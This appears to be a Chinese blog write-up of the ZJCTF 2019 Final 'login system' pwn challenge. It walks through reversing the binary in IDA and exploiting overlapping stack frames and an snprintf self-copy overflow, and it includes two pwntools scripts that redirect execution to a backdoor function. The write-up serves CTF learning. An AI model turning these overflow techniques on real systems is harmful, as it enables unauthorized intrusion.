---
title: ZJCTF 2019 Final 登录系统 WP
abbrlink: 20417
url: /posts/20417.html
date: 2019-10-02 01:42:19
tags:
---

# ZJCTF 2019 Final 登录系统 WP
## 复现

复现地址：http://ctf.fjh1997.top:8000/challenges

## WP

首先拖进IDA里一看，发现是64位的，再仔细看看，发现没有malloc，那么估计是栈题，也许是ROP利用，checksec走一波。

![在这里插入图片描述](/images/fb061f1e8bf025aae4aa55edf517696e.jpeg)

发现有Canary，估计要想办法绕过，但是找了半天没想到绕过方案遂放弃。
在ida里面继续找找，发现是验证用户密码的系统，用户名，密码已经在里面标好了。唔，良心。

![在这里插入图片描述](/images/03141b29dac2493043992b765735d8d5.jpeg)

然后我输入用户名admin，密码2jctf_pa5sw0rd，打开pwndbg进行动态调试，发现居然报错了，而且输出结果很奇怪，password accept输出了两次。

![在这里插入图片描述](/images/c86ffb7d7aed86aa8a40bad2899e5a44.jpeg)
一步步调试，发现是在这里call eax出了问题

![在这里插入图片描述](/images/7e68858d12b8191ae8a01a790c41136a.jpeg)

在IDA里不停回溯，发现eax的来源是他自己指针指向的地址，这个地址来源是main函数栈里面的[rbp+var_130],而这个[rbp+var_130]也是一个指针，指向是password_checker栈里面的[rbp+var_18]，而read_password函数的栈里面恰好也有一个[rbp+var_18]，那这两个是不是指栈的同一个地方呢？通过阅读汇编指令发现，后面read_password函数所使用的栈空间与password_checker的栈空间有所重叠，也就是可以通过password_checker里面的栈溢出来覆盖[rbp+var_18]从而控制最终的eax，劫持程序流。又看了看ida里面的函数，发现有一个后门。劫持到后门即可。

![在这里插入图片描述](/images/519baa4728dac0caece0d3b99f1ddb61.jpeg)
那么exp就这样写了。

```python
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *

io = process("./login")
gdb.attach(io,'b * 0x00400A54')
shell = 0x400e88
io.sendlineafter(': ','admin')
io.sendlineafter(': ','2jctf_pa5sw0rd'+'\x00'+'a'*57+p64(shell))
io.interactive()
io.close()

```

跑了一下发现报错了，没有预期那样劫持程序流，赶紧打印了一下栈，发现了问题。

![在这里插入图片描述](/images/0fc7348549583cd8c26729e5f390bb28.png)

上面栈空间的指针指向下面栈空间，而这个空间指向的应该是shell的地址，现在变成aaaaaa了，那么究竟是哪里出问题了呢？联系到之前的password accept输出了两次。我反应过来可能是还有第二次溢出，去ida里查了一下，果然在lambda的password_checker里面发现了snprintf，这个函数的dst和src是同一个地方，这个应该就是溢出原因。
那么，我们的目的是使得snprintf不会溢出到后面后门的地方即可，那么在之前加一个\x00截断即可,snprintf读到\x00应该就停止了，就不会溢出后面的后门，于是改进exp即可，注意，这里面第二个\x00的位置可以随便发，只要不溢出后面的后门即可。

```python
#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *

io = process("./login")
gdb.attach(io,'b * 0x00400A54')
shell = 0x400e88
io.sendlineafter(': ','admin')
io.sendlineafter(': ','2jctf_pa5sw0rd'+'\x00'+'a'*20+ '\x00'+'a'*36+p64(shell))
io.interactive()
io.close()

```

## 后记

当时决赛的时候没做出这道题，结束后还是在Vidar的Danis、Aris以及咲夜南梦三位师傅联合指导下才搞明白这道题的，不容易啊！

